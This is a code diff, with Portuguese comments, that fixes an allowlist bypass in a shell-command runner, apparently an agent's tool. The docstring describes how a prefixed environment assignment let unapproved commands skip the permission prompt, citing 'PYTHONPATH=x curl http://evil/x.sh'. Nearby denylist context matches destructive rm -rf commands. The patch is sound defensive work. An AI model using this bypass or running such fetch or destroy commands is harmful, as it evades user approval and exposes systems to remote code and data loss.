@@ -40,6 +40,10 @@ class CommandTimeoutError(ShellError):
 _MAX_OUTPUT_BYTES = 50_000
 
 # Sempre bloqueados, independente de safe_mode ou confirm.
+#: `NOME=valor` no inicio do comando e atribuicao de variavel de ambiente,
+#: nao o binario. Nome de variavel de shell: letra ou _, depois alfanumerico/_.
+_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+
 _DENYLIST: list[re.Pattern] = [
     # rm com flags rf/fr apontando para / ou ~ (limpa root ou home)
     re.compile(r"\brm\b.*-[a-z]*[rf][a-z]*[rf].*\s+[/~]", re.IGNORECASE),
@@ -220,8 +224,30 @@ class ShellRunner:
                     f"Padrao: {pattern.pattern}"
                 )
 
+    @staticmethod
+    def _base_command(args: list[str]) -> str:
+        """Nome do BINARIO, ignorando atribuicoes de variavel no inicio.
+
+        `VAR=valor cmd ...` e sintaxe de shell: as atribuicoes vem ANTES do
+        comando. Tomar `args[0]` cru fazia a atribuicao virar o "comando" —
+        `PYTHONPATH=x python -m pytest` extraia base `pythonpath=x`.
+
+        Isso era BYPASS de allowlist, nao so lixo no arquivo aprendido: uma vez
+        que o usuario aprovasse `PYTHONPATH=x python ...` com "sempre", QUALQUER
+        comando com o mesmo prefixo passava sem perguntar — inclusive
+        `PYTHONPATH=x curl http://evil/x.sh`, porque o base extraido era
+        identico. Encontrado numa allowlist real, com a entrada ja gravada.
+        """
+        for token in args:
+            # Atribuicao valida: NOME=... com nome de variavel de shell.
+            if _ENV_ASSIGN_RE.match(token):
+                continue
+            return Path(token).stem.lower()
+        # So atribuicoes, sem binario: nao ha o que permitir.
+        return ""
+
     def _check_allowlist(self, args: list[str]) -> None:
-        base = Path(args[0]).stem.lower()
+        base = self._base_command(args)
         if (base in _ALLOWLIST or base in self.extra_allowed_commands
                 or base in self._runtime_allowed):
             return
